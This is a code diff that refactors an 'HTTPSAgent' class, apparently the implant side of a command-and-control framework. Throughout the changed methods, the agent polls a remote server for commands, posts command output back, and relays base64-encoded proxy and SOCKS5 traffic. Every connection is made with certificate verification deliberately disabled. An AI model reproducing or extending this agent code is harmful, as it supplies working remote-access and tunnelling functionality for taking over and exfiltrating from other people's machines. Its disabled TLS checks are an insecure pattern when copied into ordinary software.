@@ -18,12 +18,15 @@ class HTTPSAgent(LocalAgent):
 
 	def getScriptName(self):
 		return os.path.realpath(__file__)
-        
-	def postHTTPS(self, headers, resource, cmd_output):
+
+	def getHTTPSConnection(self):
 		ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
 		ssl_context.check_hostname = False
 		ssl_context.verify_mode = ssl.CERT_NONE
-		connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+		return http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+
+	def postHTTPS(self, headers, resource, cmd_output):
+		connection = self.getHTTPSConnection()
 		connection.request('POST', resource, cmd_output + os.linesep, headers)
 		connection.getresponse().read().decode()
    
@@ -57,10 +60,7 @@ class HTTPSAgent(LocalAgent):
             
 	def pollServer(self):
 		try:
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
-			ssl_context.check_hostname = False
-			ssl_context.verify_mode = ssl.CERT_NONE
-			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection = self.getHTTPSConnection();
 			connection.request('GET', '/test', "MOAR COMMANDS", self.headers)
 		except Exception as e:
 			print("Oops, something went wrong: {}".format(e), file=sys.stderr)
@@ -79,10 +79,7 @@ class HTTPSAgent(LocalAgent):
 		try:    
 			localheaders = self.headers.copy()
 			localheaders['ForwardRequest'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
-			ssl_context.check_hostname = False
-			ssl_context.verify_mode = ssl.CERT_NONE
-			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection = connection = self.getHTTPSConnection()
 			connection.request('GET', '/proxy', "MOAR COMMANDS", localheaders)
 			response = connection.getresponse().read().decode()
 			if response == "<No Data>":
@@ -97,10 +94,7 @@ class HTTPSAgent(LocalAgent):
 		try:    
 			localheaders = self.headers.copy()
 			localheaders['ProxyId'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
-			ssl_context.check_hostname = False
-			ssl_context.verify_mode = ssl.CERT_NONE
-			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection = self.getHTTPSConnection()
 			connection.request('GET', '/socks5', "MOAR COMMANDS", localheaders)
 			response = connection.getresponse().read().decode()
 			if response == "<No Data>":
@@ -116,12 +110,9 @@ class HTTPSAgent(LocalAgent):
 			im_b64 = base64.b64encode(data).decode('ascii')
 			localheaders = self.headers.copy()
 			localheaders['ProxyId'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
-			ssl_context.check_hostname = False
-			ssl_context.verify_mode = ssl.CERT_NONE
-			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection = self.getHTTPSConnection()
 			connection.request('POST', "/socks5", im_b64, localheaders)
-			response = connection.getresponse().read().decode()
+			connection.getresponse().read().decode()
 		except Exception as e:
 			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)
 
@@ -130,10 +121,7 @@ class HTTPSAgent(LocalAgent):
 			im_b64 = base64.b64encode(data).decode('ascii')
 			localheaders = self.headers.copy()
 			localheaders['ForwardRequest'] = forwardID
-			ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH) 
-			ssl_context.check_hostname = False
-			ssl_context.verify_mode = ssl.CERT_NONE
-			connection = http.client.HTTPSConnection(self.http_server, self.http_port, context=ssl_context)
+			connection = self.getHTTPSConnection()
 			connection.request('POST', "/proxy", im_b64, localheaders)
 		except Exception as e:
 			print("Oops, something went wrong, pushForward: {}".format(e), file=sys.stderr)
